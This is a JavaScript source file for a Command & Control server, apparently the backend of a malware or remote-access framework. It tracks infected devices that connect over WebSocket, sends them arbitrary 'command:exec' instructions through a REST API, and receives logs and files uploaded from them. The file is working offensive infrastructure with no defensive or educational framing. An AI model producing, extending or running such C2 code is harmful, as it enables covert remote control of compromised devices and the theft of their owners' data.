/**
 * @file server.js
 * @description Main Command & Control (C2) server entry point.
 * Handles WebSocket connections from payloads and REST API for the dashboard.
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const helmet = require('helmet');
const cors = require('cors');
const pino = require('pino');

const logger = pino({ level: process.env.LOG_LEVEL || 'info' });
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(helmet());
app.use(cors());
app.use(express.json());

// Device Registry
const devices = new Map();

/**
 * WebSocket Connection Handler
 */
io.on('connection', (socket) => {
    const deviceId = socket.handshake.query.id;
    const platform = socket.handshake.query.platform;

    if (!deviceId) {
        logger.warn('Connection attempt without device ID');
        return socket.disconnect();
    }

    logger.info({ deviceId, platform }, 'New device connected');

    devices.set(deviceId, {
        id: deviceId,
        platform,
        socketId: socket.id,
        lastSeen: new Date(),
        status: 'online'
    });

    socket.on('disconnect', () => {
        logger.info({ deviceId }, 'Device disconnected');
        const device = devices.get(deviceId);
        if (device) {
            device.status = 'offline';
            device.lastSeen = new Date();
        }
    });

    // Handle incoming data from device
    socket.on('data:sync', (payload) => {
        logger.debug({ deviceId, type: payload.type }, 'Data received from device');
        // Process incoming logs, files, or status updates
    });
});

// API Routes
app.get('/api/devices', (req, res) => {
    res.json(Array.from(devices.values()));
});

app.post('/api/command', (req, res) => {
    const { deviceId, command, params } = req.body;
    const device = devices.get(deviceId);

    if (!device || device.status !== 'online') {
        return res.status(404).json({ error: 'Device not found or offline' });
    }

    io.to(device.socketId).emit('command:exec', { command, params });
    res.json({ status: 'sent', timestamp: new Date() });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    logger.info(`C2 Server running on port ${PORT}`);
});
